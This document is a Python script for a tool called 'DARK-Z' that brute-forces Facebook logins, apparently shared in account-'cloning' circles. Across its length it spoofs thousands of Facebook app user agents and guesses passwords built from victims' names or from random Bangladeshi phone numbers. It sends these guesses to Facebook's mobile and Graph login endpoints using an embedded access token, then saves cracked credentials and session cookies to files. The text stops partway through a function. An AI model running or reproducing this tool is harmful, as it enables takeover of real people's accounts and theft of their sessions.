import uuid
import string
from os import path
from urllib.request import urlopen
import os
import time
import re
import random
import sys
import subprocess
import platform
import base64
from string import *
from concurrent.futures import ThreadPoolExecutor as tred
from concurrent.futures import ThreadPoolExecutor as ThreadPool
import getpass

def clear():
    os.system('clear')
#------------------[ DARK-INTRO ]-------------------#
print('\033[97;1m[\033[92;1m+\033[97;1m] \033[0;92mChecking Update... ')
time.sleep(5)
os.system("git pull")
os.system('clear')
print('\033[97;1m[\033[92;1m+\033[97;1m] \033[0;92mInstalling modules... ')
time.sleep(5)
os.system("pkg install espeak")
os.system("pip install requests")
os.system("pip install rich")
os.system("pip install bs4")
os.system('clear')
print("\033[97;1m[\033[92;1m+\033[97;1m] \033[0;92mJOIN OUR FACEBOOK GROUP")
time.sleep(1)
os.system(f'xdg-open https://www.facebook.com/groups/2477016825771219')
print()
print("\033[97;1m[\033[92;1m+\033[97;1m] \033[0;92mFOLLOW MY GITHUB ACCOUNT")
time.sleep(1)
os.system(f'xdg-open https://github.com/coderet-d-looper')
print()
attemps = 0
while attemps < 12345677901:
    username = input('\033[97;1m[\033[92;1m+\033[97;1m] \033[0;97mEnter username: ')
    password = input('\033[97;1m[\033[92;1m+\033[97;1m] \033[0;97mEnter password: ')

    if username == 'T' and password == 'M':
        print('\033[97;1m[\033[92;1m+\033[97;1m] \033[0;93mLOGIN SUCCESSFULLY.....')
        os.system('espeak -a 300 " Login, Successfull"')
        time.sleep(5)
        break
    else:
        print('\033[97;1m[\033[92;1m+\033[97;1m] \033[0;91mIncorrect Please Trying ')
        time.sleep(5)
        attemps += 1
        continue

os.system('clear')

try:
    import requests
except ModuleNotFoundError:
    print('\n Installing missing modules ...')
    os.system('pip install requests futures==2 > /dev/null')
    os.system('python Dark.py')
#------------------[ DARK-USERAGENT ]-------------------#
except:pass
ugen = []
for x in range(5000):
    android_version = f"{random.randint(4, 12)}.{random.randint(0, 9)}.{random.randint(0, 9)}"
    android_os = f"Android {android_version}"
    model = random.choice(['GT-I9300', 'GT-I9500', 'GT-N7100', 'GT-I9100', 'GT-I9505', 'GT-N7000', 'GT-I9000', 'GT-I9082', 'GT-S5360', 'GT-I9192','GT-S5830', 'GT-I9506', 'GT-S7562', 'GT-I9190', 'GT-I9305', 'GT-I9060', 'GT-I9301', 'GT-I9308', 'GT-I9060I', 'GT-I9308I','GT-I8160', 'GT-S7262', 'GT-S5830i', 'GT-S7582', 'GT-S6802', 'GT-I8190', 'GT-S5282', 'GT-I9070', 'GT-I8262', 'GT-I8552','GT-S6102', 'GT-I9305T', 'GT-I9508', 'GT-S7580', 'GT-I9507', 'GT-S5300', 'GT-I9063T', 'GT-I9195', 'GT-S6310', 'GT-S7560','GT-S5301', 'GT-I9070P', 'GT-S7275', 'GT-I9105', 'GT-S6312', 'GT-I9308T', 'GT-I8550', 'GT-I9152', 'GT-I9200', 'GT-S7390',])
    build = f"Build/R{random.randint(10, 99)}NW"
    fb_app_version = f"FBAV/{random.randint(190, 199)}.0.0.{random.randint(10, 99)}"
    fb_locale = random.choice(["en_US", "th_TH", "fr_FR", "de_DE", "es_ES", "it_IT"])
    fb_carrier = random.choice(["AIS", "DTAC", "TrueMove"])
    fb_manufacturer = random.choice(["samsung"])
    fb_device = f"FBMF/{fb_manufacturer};FBBD/{fb_manufacturer};FBDV/{model};FBSV/{android_version};FBCA/armeabi-v7a:armeabi"
    fb_display_metrics = f"FBDM/{{density=3.0,width={random.randint(720, 1440)},height={random.randint(1280, 2560)}}}"
    fb_fw = f"FB_FW/{random.randint(1, 5)}"
    user_agent = f"Dalvik/2.1.0 (Linux; U; {android_os}; {model} {build}) [FBAN/Orca-Android;{fb_app_version};FBPN/com.facebook.orca;FBLC/{fb_locale};FBBV/{random.randint(100000000, 999999999)};FBCR/{fb_carrier};{fb_device};{fb_display_metrics};{fb_fw};]"
    ugen.append(user_agent)

for x in range(5000):
    android_version = f"{random.randint(4, 12)}.{random.randint(0, 9)}.{random.randint(0, 9)}"
    android_os = f"Android {android_version}"
    model = random.choice(['Mi 11', 'Mi 11 Pro', 'Mi 11i', 'Mi 11X', 'Mi 11X Pro', 'Mi 11 Lite', 'Mi 11 Lite 5G', 'Mi 11 Ultra', 'Mi 10', 'Mi 10 Pro','Mi 10 Lite', 'Mi 10 Youth', 'Mi 10T', 'Mi 10T Pro', 'Mi 10T Lite', 'Mi 10i', 'Mi 9', 'Mi 9 Pro', 'Mi 9 Lite', 'Mi 9T', 'Mi 9T Pro','Mi 9 SE', 'Mi Mix 4', 'Mi Mix Fold', 'Mi Mix Alpha', 'Mi Mix 3', 'Mi Mix 3 5G', 'Mi Mix 2', 'Mi Mix 2S', 'Mi Mix 2 Pro', 'Mi Mix','Mi Mix Nano', 'Mi Note 10', 'Mi Note 10 Pro', 'Mi Note 10 Lite', 'Mi Note 9', 'Mi Note 9 Pro', 'Mi Note 9S', 'Mi Note 9 Pro Max','Mi Note 9 Pro 5G', 'Mi Note 9T', 'Mi Note 8', 'Mi Note 8 Pro', 'Mi Note 8T', 'Mi Note 7', 'Mi Note 7 Pro', 'Mi Note 6', 'Mi Note 6 Pro','Mi Note 5', 'Mi A3', 'Mi A2', 'Mi A2 Lite', 'Mi A1', 'Mi A1 Lite'])
    build = f"Build/R{random.randint(10, 99)}NW"
    fb_app_version = f"FBAV/{random.randint(190, 199)}.0.0.{random.randint(10, 99)}"
    fb_locale = random.choice(["en_US", "th_TH", "fr_FR", "de_DE", "es_ES", "it_IT"])
    fb_carrier = random.choice(["AIS", "DTAC", "TrueMove"])
    fb_manufacturer = random.choice(["xiaomi"])
    fb_device = f"FBMF/{fb_manufacturer};FBBD/{fb_manufacturer};FBDV/{model};FBSV/{android_version};FBCA/armeabi-v7a:armeabi"
    fb_display_metrics = f"FBDM/{{density=3.0,width={random.randint(720, 1440)},height={random.randint(1280, 2560)}}}"
    fb_fw = f"FB_FW/{random.randint(1, 5)}"
    user_agent = f"Dalvik/2.1.0 (Linux; U; {android_os}; {model} {build}) [FBAN/Orca-Android;{fb_app_version};FBPN/com.facebook.orca;FBLC/{fb_locale};FBBV/{random.randint(100000000, 999999999)};FBCR/{fb_carrier};{fb_device};{fb_display_metrics};{fb_fw};]"
    ugen.append(user_agent)

for x in range(10000):
    android_version = f"{random.randint(4, 12)}.{random.randint(0, 9)}.{random.randint(0, 9)}"
    android_os = f"Android {android_version}"
    model = random.choice(['A1', 'A1k', 'A3', 'A3s', 'A5', 'A5s', 'A7', 'A7x', 'A9', 'A9x', 'A11', 'A11x', 'A12', 'A15', 'A15s', 'A31','A32', 'A33', 'A37', 'A39', 'A51', 'A53', 'A54', 'A55', 'A57', 'A59', 'A71', 'A72', 'A73', 'A74', 'A75', 'A76','A77', 'A79', 'A83', 'A93', 'A94', 'F1', 'F1 Plus', 'F1s', 'F3', 'F3 Plus', 'F5', 'F5 Youth', 'F7', 'F7 Youth','F9', 'F9 Pro', 'F11', 'F11 Pro', 'F15', 'F17', 'Find X', 'Find X2', 'Find X3', 'Find X3 Pro', 'R1', 'R1x', 'R3'])
    build = f"Build/R{random.randint(10, 99)}NW"
    fb_app_version = f"FBAV/{random.randint(190, 199)}.0.0.{random.randint(10, 99)}"
    fb_locale = random.choice(["en_US", "th_TH", "fr_FR", "de_DE", "es_ES", "it_IT"])
    fb_carrier = random.choice(["AIS", "DTAC", "TrueMove"])
    fb_manufacturer = random.choice(["oppo"])
    fb_device = f"FBMF/{fb_manufacturer};FBBD/{fb_manufacturer};FBDV/{model};FBSV/{android_version};FBCA/armeabi-v7a:armeabi"
    fb_display_metrics = f"FBDM/{{density=3.0,width={random.randint(720, 1440)},height={random.randint(1280, 2560)}}}"
    fb_fw = f"FB_FW/{random.randint(1, 5)}"
    user_agent = f"Dalvik/2.1.0 (Linux; U; {android_os}; {model} {build}) [FBAN/Orca-Android;{fb_app_version};FBPN/com.facebook.orca;FBLC/{fb_locale};FBBV/{random.randint(100000000, 999999999)};FBCR/{fb_carrier};{fb_device};{fb_display_metrics};{fb_fw};]"
    ugen.append(user_agent)
#------------------[ DARK-UNKNOWN ]-------------------#
sim_id = ''
android_version = subprocess.check_output(
    'getprop ro.build.version.release', shell=True).decode('utf-8').replace('\n', '')
model = subprocess.check_output(
    'getprop ro.product.model', shell=True).decode('utf-8').replace('\n', '')
build = subprocess.check_output(
    'getprop ro.build.id', shell=True).decode('utf-8').replace('\n', '')
fblc = 'en_GB'
try:
    fbcr = subprocess.check_output('getprop gsm.operator.alpha', shell=True).decode(
        'utf-8').split(',')[0].replace('\n', '')
except:
    fbcr = 'Zong'
fbmf = subprocess.check_output(
    'getprop ro.product.manufacturer', shell=True).decode('utf-8').replace('\n', '')
fbbd = subprocess.check_output(
    'getprop ro.product.brand', shell=True).decode('utf-8').replace('\n', '')
fbdv = model
fbsv = android_version
fbca = subprocess.check_output('getprop ro.product.cpu.abilist', shell=True).decode(
    'utf-8').replace(',', ':').replace('\n', '')
fbdm = '{density=2.25,height='+subprocess.check_output('getprop ro.hwui.text_large_cache_height', shell=True).decode('utf-8').replace(
    '\n', '')+',width='+subprocess.check_output('getprop ro.hwui.text_large_cache_width', shell=True).decode('utf-8').replace('\n', '')
try:
    fbcr = subprocess.check_output(
        'getprop gsm.operator.alpha', shell=True).decode('utf-8').split(',')
    total = 0
    for i in fbcr:
        total += 1
    select = ('1', '2')
    if select == '1':
        fbcr = subprocess.check_output('getprop gsm.operator.alpha', shell=True).decode(
            'utf-8').split(',')[0].replace('\n', '')
        sim_id += fbcr
    elif select == '2':
        try:
            fbcr = subprocess.check_output('getprop gsm.operator.alpha', shell=True).decode(
                'utf-8').split(',')[1].replace('\n', '')
            sim_id += fbcr
        except Exception as e:
            fbcr = "Zong"
            sim_id += fbcr
    else:
        fbcr = 'Zong'
        sim_id += fbcr
except:
    fbcr = "Zong"
device = {
    'android_version': android_version,
    'model': model,
    'build': build,
    'fblc': fblc,
    'fbmf': fbmf,
    'fbbd': fbbd,
    'fbdv': model,
    'fbsv': fbsv,
    'fbca': fbca,
    'fbdm': fbdm}

#------------------[ DARK-LOGO ]-------------------#
logo = ("""

██████╗░░█████╗░██████╗░██╗░░██╗        ███████╗
██╔══██╗██╔══██╗██╔══██╗██║░██╔╝        ╚════██║
██║░░██║███████║██████╔╝█████═╝░        ░░███╔═╝
██║░░██║██╔══██║██╔══██╗██╔═██╗░        ██╔══╝░░
██████╔╝██║░░██║██║░░██║██║░╚██╗        ███████╗
╚═════╝░╚═╝░░╚═╝╚═╝░░╚═╝╚═╝░░╚═╝        ╚══════╝

\033[1;91m\033[1;41m\033[1;97m              Be you, The world will adjust               \033[;0m\033[1;91m\033[1;92m

\033[1;92m══════════════════════════════════════════
\033[1;32m[👨] AUTHOR    :\033[1;32m DARK X FUZED 
\033[1;32m[📖] GITHUB    :\033[1;32m CODERET-D-LOOPER
\033[1;32m[😇] FACEBOOK  :\033[1;32m FIRDAWS SAPNO
\033[1;32m[💉] TOOLS     :\033[1;32m PREMIUM
\033[1;32m[📅] VERSION   :\033[1;32m 3.9 [DEXA-H]
\033[1;32m[🚀] STATUS    :\033[1;32m WORKING
\033[1;32m[⏳] UPDATE    :\033[1;32m EVERYDAY AT 12.00AM
\033[1;91m<═══\033[1;41m\033[1;97m WORKING ONLY ON MOBILE DATA\033[;0m\033[1;91m═══>\033[1;92m
\033[1;92m══════════════════════════════════════════""")

def linex():
    print('\033[1;92m══════════════════════════════════════════')

def clear():
    os.system('clear')
    print(logo)


loop = 0
oks = []
cps = []
twf = []
pcp = []
id = []
tokenku = []

#------------------[ DARK-MENU ]-------------------#
def menu():
    try:
        clear()
        if 1 == 1:
            clear()
            os.system('espeak -a 300 " Welcome,   to,  DARK,  Z,  Tools"')
            print(
            "\033[38;5;46m•\033[38;5;196m•\033[1;35m•\033[1;34m•\033[1;33m•\033[1;32m•\033[1;97m•\033[38;5;196m•\033[38;5;46m•\033[1;35m•\033[1;34m•\033[1;33m•\033[1;32m•\033[1;97m•\033[38;5;196m•\033[38;5;46m•\033[1;32m•\033[1;35m•\033[1;34m•\033[1;97m•\033[1;33m•\033[38;5;196m•\033[1;35m•\033[1;34m•\033[1;33m•\033[1;32m•\033[1;97m•\033[38;5;196m•\033[38;5;46m•\033[38;5;196m•\033[1;32m•\033[1;97m•\033[1;35m•\033[1;34m•\033[1;33m•\033[38;5;46m•\033[1;97m•")
            print('\033[1;37m[01] FILE CLONING [OFF]\n\033[1;37m[02] RANDOM CLONING [WORKING]\n\033[1;37m[03] VISIT MY ACCOUNT\n\033[1;37m[04] CLOSE TOOL')
            print(
            "\033[38;5;46m•\033[38;5;196m•\033[1;35m•\033[1;34m•\033[1;33m•\033[1;32m•\033[1;97m•\033[38;5;196m•\033[38;5;46m•\033[1;35m•\033[1;34m•\033[1;33m•\033[1;32m•\033[1;97m•\033[38;5;196m•\033[38;5;46m•\033[1;32m•\033[1;35m•\033[1;34m•\033[1;97m•\033[1;33m•\033[38;5;196m•\033[1;35m•\033[1;34m•\033[1;33m•\033[1;32m•\033[1;97m•\033[38;5;196m•\033[38;5;46m•\033[38;5;196m•\033[1;32m•\033[1;97m•\033[1;35m•\033[1;34m•\033[1;33m•\033[38;5;46m•\033[1;97m•")
            xd = input('\033[1;37m[💥] CHOOSE : ')
            if xd in ['1', '01']:
                clear()
                os.system('espeak -a 300 " Enter, your, file , name"')
                print('\033[1;32m[PUT FILE EXAMPLE:  /sdcard/DARK.txt  Etc...]')
                file = input('\033[1;37m[📂] INPUT FILE NAME: ')
                try:
                    fo = open(file, 'r').read().splitlines()
                except FileNotFoundError:
                    os.system('espeak -a 300 " File, location, not, found"')
                    print('[❌] FILE LOCATION NOT FOUND [❌]')
                    time.sleep(1)
                    menu()
                clear()
                print('\033[1;32m[1] METHOD 1 [BEST WORKING]\n[2] METHOD 2')
                os.system('espeak -a 300 " Choose, method, for, cloning"')
                linex()
                mthd = input('\033[1;32m[+] CHOOSE : ')
                linex()
                plist = []
                print('\033[1;37m           SELECT CRACK MENU')
                linex()
                print('[1] AUTO PASSWORD [BEST]\n[2] MANUAL PASSWORD')
                linex()
                ppp = input('\033[1;32m[+] CHOOSE : ')
                if ppp in ['1', '01']:
                    plist.append('first last')
                    plist.append('first')
                    plist.append('firstlast')
                    plist.append('first123')
                    plist.append('first1234')
                    plist.append('first12345')
                    plist.append('first123456')
                    plist.append('first1122')
                    plist.append('first@@')
                    plist.append('first@@@')
                    plist.append('first@@@@')
                    plist.append('first12')
                    plist.append('first111')
                    plist.append('first11')
                    plist.append('i love you')
                    plist.append('last')
                else:
                    try:
                        linex()
                        ps_limit = int(
                            input(' HOW MANY PASSWORD DO YOU WANT TO ADD ? '))
                    except:
                        ps_limit = 15
                    linex()
                    print('\033[1;32m EXAMPLE: first last,firtslast,first123')
                    linex()
                    for i in range(ps_limit):
                        plist.append(
                            input(f'\033[1;32m[+] PUT PASSWORD {i+1}: '))
                linex()
                print('[🍬]SHOW CP ACCOUNT? (Y/n): ')
                linex()
                cx = input(' CHOOSE: ')
                if cx in ['y', 'Y', 'yes', 'Yes', '1']:
                    pcp.append('y')
                else:
                    pcp.append('n')
                with tred(max_workers=30) as crack_submit:
                    clear()
                    total_ids = str(len(fo))
                    print('[🧮] TOTAL ID : \033[1;32m'+total_ids)
                    print("\033[1;35m[🚄] CRACKING SPEED - FAST✅ ")
                    print("\033[1;33m[🔍] CRACKING HAS BEEN STARTED")
                    linex()
                    print("""\033[1;91m<═══\033[1;41m\033[1;97m ✈ USE FLIGHT MODE IN EVERY 5 MIN\033[;0m\033[1;91m═══>\033[1;92m""")
                    linex()
                    for user in fo:
                        ids, names = user.split('|')
                        passlist = plist
                        if mthd in ['1', '01']:
                            crack_submit.submit(ffb, ids, names, passlist)
                        elif mthd in ['2', '02']:
                            crack_submit.submit(api, ids, names, passlist)
                        else:
                            crack_submit.submit(api1, ids, names, passlist)
                print('\033[1;37m')
                linex()
                os.system('espeak -a 300 " Cracking, has, completed"')
                print('[😘]CRACKING HAS COMPLETED')
                print('[🔰]Total OK/CP/2F: '+str(len(oks)) +
                      '/'+str(len(cps))+'/'+str(len(twf)))
                linex()
                os.system('espeak -a 300 " press, enter, for, main, menu"')
                input('[👉]PRESS ENTER FOR MAIN MENU[👈]')
                os.system('python Dark.py')
            elif xd in ['3', '03']:
                os.system(' xdg-open https://www.facebook.com/coderet.d.looper')
                menu()
            elif xd in ['4', '04']:
                exit('BYE BYE Tata Gaya')
            elif xd in ['2', '02']:
                clear()
                print(
                    ' [1] Bangladesh cloning \n [0] Back menu')
                linex()
                x = input(' Choose: ')
                if x in ['1', '01']:
                    bd()
                if xd in ['0', '00']:
                    menu()
            else:
                exit(' Option not found in menu...')
        else:
            print(' Run :  python Dark.py')
            linex()
            exit()
    except ValueError:
        exit()
    except requests.exceptions.ConnectionError:
        print('\n No internet connection ...')
        exit()

def bd():
    user = []
    clear()
    twf =[]
    os.getuid
    os.geteuid
    os.system("clear")
    print(logo)
    os.system('espeak -a 300 " Welcome, to, random, cloning, tool"')
    print(" BD SIM CODE=><>< 017,018,019,014,013,015")
    print("\033[38;5;46m•\033[38;5;196m•\033[1;35m•\033[1;34m•\033[1;33m•\033[1;32m•\033[1;97m•\033[38;5;196m•\033[38;5;46m•\033[1;35m•\033[1;34m•\033[1;33m•\033[1;32m•\033[1;97m•\033[38;5;196m•\033[38;5;46m•\033[1;32m•\033[1;35m•\033[1;34m•\033[1;97m•\033[1;33m•\033[38;5;196m•\033[1;35m•\033[1;34m•\033[1;33m•\033[1;32m•\033[1;97m•\033[38;5;196m•\033[38;5;46m•\033[38;5;196m•\033[1;32m•\033[1;97m•\033[1;35m•\033[1;34m•\033[1;33m•\033[38;5;46m•\033[1;97m•")
    os.system('espeak -a 300 " Enter, sim ,code"')
    kode = input('[📞] ENTER SIM CODE: ')
    kodex = ''.join(random.choice(string.digits) for _ in range(2))
    kod = ''.join(random.choice(string.digits) for _ in range(2))
    limit = int(input(' [?] ENTER YOUR CRACK LIMiT : '))
    for nmbr in range(limit):
        nmp = ''.join(random.choice(string.digits) for _ in range(4))
        user.append(nmp)
    with ThreadPool(max_workers=30) as yaari:
        os.system('clear')
        print(logo)
        tl = str(len(user))
        print('\033[1;33m[♥]  TOTAL IDS :\033[1;92m ' + tl)
        print( "\033[1;33m[♥]  YOUR TARGET CRACK MENU:\033[1;92mRANDOM CLONING")
        print('\033[1;33m[♥]  THE CRACK PROCESS HAS BEEN STARTED')
        print(f"\033[1;33m[♥]  CHOOSEN SIM CODE:\033[1;92m {kode}")
        print("""\033[1;91m\033[1;41m\033[1;97m USE FLIGHT MODE IN EVERY 5 MIN\033[;0m\033[1;91m\033[1;92m""")
        print(50 * '_')
        for guru in user:
            uid = kode + kodex + kod + guru
            pwx = [kode + kodex + kod + guru, kod + guru, kodex + guru, kode + kodex + kod, kod + kodex + kode, kode + kodex, kodex + kod, kodex + kod + guru, kode + guru, 'Bangladesh', 'i love you', 'sadiya', 'fariya', 'sanjida', 'fatema', 'Farjana', 'jannat', '102030', '203040', '304050', '405060', '506070', '607080', '708090', '809010', 'mababa', 'shahin', 'sumaiya']
            yaari.submit(rcrack,uid,pwx,tl)
def rcrack(uid,pwx,tl):
    global loop
    global cps
    global oks
    global proxy
    try:
        for ps in pwx:
            sys.stdout.write(f'\r\33[1;94m[\033[1;37mDARK-Z\33[1;94m][\033[1;37m%s\33[1;94m/\033[1;37m%s\33[1;94m]\33[1;94m[\033[1;32mOK-%s\33[1;94m]\r'%(loop,tl,len(oks))),
            sys.stdout.flush()
            pro = random.choice(ugen)
            session = requests.Session()
            free_fb = session.get('https://mbasic.facebook.com').text
            log_data = {
            "lsd":re.search('name="lsd" value="(.*?)"', str(free_fb)).group(1),
            "jazoest":re.search('name="jazoest" value="(.*?)"', str(free_fb)).group(1),
            "m_ts":re.search('name="m_ts" value="(.*?)"', str(free_fb)).group(1),
            "li":re.search('name="li" value="(.*?)"', str(free_fb)).group(1),
            "try_number":"0",
            "unrecognized_tries":"0",
            "email":uid,
            "pass":ps,
            "login":"Log In"}
            header_freefb = {'authority': 'mbasic.facebook.com',
           'method': 'GET',
           'scheme': 'https',
           'access-control-allow-origin': '*',
           'facebook-api-version': 'v17.0',
           'strict-transport-security': 'max-age=15552000; preload',
           'pragma': 'no-cache',
           'cache-control': 'private, no-cache, no-store, must-revalidate',
           'x-fb-request-id': 'AQwly5VMr_y-yrCkovKzJga',
           'x-fb-trace-id': 'GFI/zKE1ENh',
           'x-fb-rev': '1007942871',
           'x-fb-debug': '6RjWdxox4h2HbM3A+ljJrv8wkYgyB4OKh1Y+Wx4y8YtQhIZwM3r7u4dQ0hXb3ixIrkSzvtzH7J2Y11HcNWfRuQ==',
           'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
           'accept-language': 'en-US,en;q=0.9',
           'cache-control': 'max-age=0',
           'sec-ch-prefers-color-scheme': 'light',
           'sec-ch-ua': '"Not)A;Brand";v="24", "Chromium";v="116"',
           'sec-ch-ua-mobile': '?1',
           'sec-ch-ua-platform': '"Android"',
           'sec-fetch-dest': 'document',
           'sec-fetch-mode': 'navigate',
           'sec-fetch-site': 'none',
           'sec-fetch-user': '?1',
           'upgrade-insecure-requests': '1',
           'user-agent': pro,
            }
            lo = session.post('https://mbasic.facebook.com/login/device-based/login/async/?refsrc=deprecated&lwv=100',data=log_data,headers=header_freefb).text
            log_cookies=session.cookies.get_dict().keys()
            if 'c_user' in log_cookies:
                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                cid = coki[7:22]
                print('\r\r\033[1;32m[DARK-OK💚] \033[1;32m'+uid+'\033[1;32m • \033[1;32m' +ps+    '  \n[COOKIES🌺] • \033[1;32m'+coki+  '  ''  \033[0;97m')
                os.system('espeak -a 300 " Dark, ok, id"')
                open('/sdcard/RANDOM-OK.txt', 'a').write(uid+' | '+ps+'\n')
                oks.append(cid)
                break
            elif 'checkpoint' in log_cookies:
                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                cid = coki[24:39]
                #print('\r\r\33[1;30m[DARK-CP💔] ' +uid+ ' • ' +ps+           '  \33[0;97m')
                #os.system('espeak -a 300 " CP"')
                open('/sdcard/RANDOM-CP.txt', 'a').write( uid+' | '+ps+' \n')
                cps.append(cid)
                break
            else:
                continue
        loop+=1
    except:pass

def ffb(ids, names, passlist):
    global loop, oks, cps
    sys.stdout.write('\r\r\033[1;37m[Dark-Z] %s|\033[1;32mOK:-%s \033[1;37m' % (loop, len(oks)))
    sys.stdout.flush()
    session = requests.Session()
    try:
        first = names.split(' ')[0]
        try:
            last = names.split(' ')[1]
        except:
            last = 'Islam'
        ps = first.lower()
        ps2 = last.lower()
        for fikr in passlist:
            pas = fikr.replace('First', first).replace(
                'Last', last).replace('first', ps).replace('last', ps2)
            ua = random.choice(ugen)
            head = {'authority': 'm.facebook.com',
           'method': 'GET',
           'scheme': 'https',
           'access-control-allow-origin': '*',
           'facebook-api-version': 'v17.0',
           'strict-transport-security': 'max-age=15552000; preload',
           'pragma': 'no-cache',
           'cache-control': 'private, no-cache, no-store, must-revalidate',
           'x-fb-request-id': 'AQwly5VMr_y-yrCkovKzJga',
           'x-fb-trace-id': 'GFI/zKE1ENh',
           'x-fb-rev': '1007942871',
           'x-fb-debug': '6RjWdxox4h2HbM3A+ljJrv8wkYgyB4OKh1Y+Wx4y8YtQhIZwM3r7u4dQ0hXb3ixIrkSzvtzH7J2Y11HcNWfRuQ==',
           'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
           'accept-language': 'en-US,en;q=0.9',
           'cache-control': 'max-age=0',
           'sec-ch-prefers-color-scheme': 'light',
           'sec-ch-ua': '"Not)A;Brand";v="24", "Chromium";v="116"',
           'sec-ch-ua-mobile': '?1',
           'sec-ch-ua-platform': '"Android"',
           'sec-fetch-dest': 'document',
           'sec-fetch-mode': 'navigate',
           'sec-fetch-site': 'none',
           'sec-fetch-user': '?1',
           'upgrade-insecure-requests': '1',
           'user-agent': ua,
}
            getlog = session.get(f'https://m.facebook.com/login/device-based/password/?uid={ids}&flow=login_no_pin&refsrc=deprecated&_rdr')
            idpass = {"lsd": re.search('name="lsd" value="(.*?)"', str(getlog.text)).group(1), "jazoest": re.search('name="jazoest" value="(.*?)"', str(getlog.text)).group(1), "uid": ids, "next": "https://m.facebook.com/login/save-device/", "flow": "login_no_pin", "pass": pas,}
            complete = session.post('https://m.facebook.com/login/device-based/validate-password/?shbl=0',data=idpass, allow_redirects=False, headers=head)
            Aking = session.cookies.get_dict().keys()
            if "c_user" in Aking:
                print("")
                print('\r\r\033[1;37m[Dark-OK💚] %s | %s' % (ids, pas))
                print('[🌺]=COOKIES ⬇')
                cookies = ""
                for k,v in session.cookies.items():
                    cookies += str(k) + "=" + str(v) + ";"
                print('\r\r\033[1;32m %s' % cookies)
                os.system('espeak -a 300 " Dark, ok, id"')
                open('/sdcard/Dark-OK.txt', 'a').write(ids+'|'+pas+'\n')
                oks.append(ids)
                break
            elif 'checkpoint' in Aking:
                if 'y' in pcp:
                    print('\r\r\x1b[38;5;208m[Dark-CP💔] '+ids+' | '+pas+'\033[1;97m')
                    os.system('espeak -a 300 " CP"')
                    open('/sdcard/Dark-CP.txt', 'a').write(ids+'|'+pas+'\n')
                    cps.append(ids)
                    break
                else:
                    break
            else:
                continue
    except requests.exceptions.ConnectionError:
        time.sleep(20)
    loop += 1


def api(ids, names, passlist):
    try:
        global oks, loop, sim_id, device
        sys.stdout.write(
            '\r\r\033[1;37m[Dark-Z] %s|\033[1;32mOK:-%s \033[1;37m' % (loop, len(oks)))
        sys.stdout.flush()

        fn = names.split(' ')[0]

        try:
            ln = names.split(' ')[1]
        except:
            ln = fn

        for pw in passlist:
            pas = pw.replace('first', fn.lower()).replace('First', fn).replace('last', ln.lower(
            )).replace('Last', ln).replace('Name', names).replace('name', names.lower())
            accessToken = '350685531728|62f8ce9f74b12f84c123cc23437a4a32'
            fbav = f'{random.randint(111,999)}.0.0.{random.randint(11,99)}.{random.randint(111,999)}'
            fbbv = str(random.randint(111111111, 999999999))
            android_version = device['android_version']
            model = device['model']
            build = device['build']
            fblc = device['fblc']
            fbcr = sim_id
            fbmf = device['fbmf']
            fbbd = device['fbbd']
            fbdv = device['fbdv']
            fbsv = device['fbsv']
            fbca = device['fbca']
            fbdm = device['fbdm']
            fbfw = '1'
            fbrv = '0'
            fban = 'FB4A'
            fbpn = 'com.facebook.katana'
            ua = 'Davik/2.1.0 (Linux; U; Android '+android_version+'.0.1; '+model+' Build/'+build+') [FBAN/'+fban+';FBAV/'+fbav+';FBBV/'+fbbv+';FBDM/{density=2.625,width=1080,height=1920};FBLC/'+fblc+';FBRV/'+str(
                random.randint(000000000, 999999999))+';FBCR/'+fbcr+';FBMF/'+fbmf+';FBBD/'+fbbd+';FBPN/'+fbpn+';FBDV/'+fbdv+';FBSV/'+fbsv+';FBOP/19;FBCA/'+fbca+';]'
            random_seed = random.Random()
            adid = str(''.join(random_seed.choices(string.hexdigits, k=16)))
            device_id = str(uuid.uuid4())
            secure = str(uuid.uuid4())
            family = str(uuid.uuid4())
            accessToken = '350685531728|62f8ce9f74b12f84c123cc23437a4a32'
            xd = str(''.join(random_seed.choices(string.digits, k=20)))
            sim_serials = f'["{xd}"]'
            li = ['28', '29', '210']
            li2 = random.choice(li)
            j1 = ''.join(random.choice(string.digits) for _ in range(2))
            jazoest = li2+j1
            data = {
                'adid': adid,
                'format': 'json',
                'device_id': device_id,
                'email': ids,
                'password': pas,
                'generate_analytics_claims': '1',
                'community_id': '',
                "sim_country": "id",
                'try_num': '1',
                'family_device_id': family,
                'sim_serials': sim_serials,
                'credentials_type': 'password',
                'source': 'login',
                'error_detail_type': 'button_with_disabled',
                'logged_out_id': str(uuid.uuid4()),
                'generate_session_cookies': '1',
                'generate_machine_id': '1',
                'tier': 'regular',
                'reg_instance': str(uuid.uuid4()),
                'meta_inf_fbmeta': '',
                'currently_logged_in_userid': '0',
                'locale': fblc,
                'client_country_code': '',
                'fb_api_req_friendly_name': 'authenticate',
                'fb_api_caller_class': 'com.facebook.account.login.protocol.Fb4aAuthHandler',
            }
            headers = {
                'Authorization': f'OAuth {accessToken}',
                'X-FB-Friendly-Name': 'authenticate',
                'X-FB-Connection-Bandwidth': str(random.randint(2e7, 3e7)),
                'X-FB-Net-HNI': str(random.randint(11111, 99999)),
                'X-FB-SIM-HNI': str(random.randint(11111, 99999)),
                'User-Agent': ua,
                'Accept-Encoding': 'gzip, deflate',
                'Content-Type': 'application/x-www-form-urlencoded',
                'X-FB-HTTP-Engine': 'Liger'
            }
            url = 'https://b-graph.facebook.com/auth/login'
            twf = 'Login approval'+'s are on. '+'Expect an SMS' + \
                ' shortly with '+'a code to use'+' for log in'
            po = requests.post(url, data=data, headers=headers).json()
            if 'session_key' in po:
                print("")
                print('\r\r\033[1;37m[Dark-OK💚] '+ids+' | '+pas+'\033[1;97m')
                print('[🌺]=COOKIES ⬇')
                cookies = ""
                for k,v in po.cookies.items():
                    cookies += str(k) + "=" + str(v) + ";"
                print('\r\r\033[1;32m %s' % cookies)
                os.system('espeak -a 300 " Dark, ok, id"')
                open('/sdcard/Dark-OK.txt', 'a').write(ids+'|'+pas+'\n')
                oks.append(ids)
                break
            elif twf in str(po):
                if 'y' in pcp:
                    print("")
                    print('\r\r \033[1;34m[Dark-2F] '+ids+' | '+pas)
                    twf.append(ids)
                    break
            elif 'www.facebook.com' in po['error']['message']:
                if 'y' in pcp:
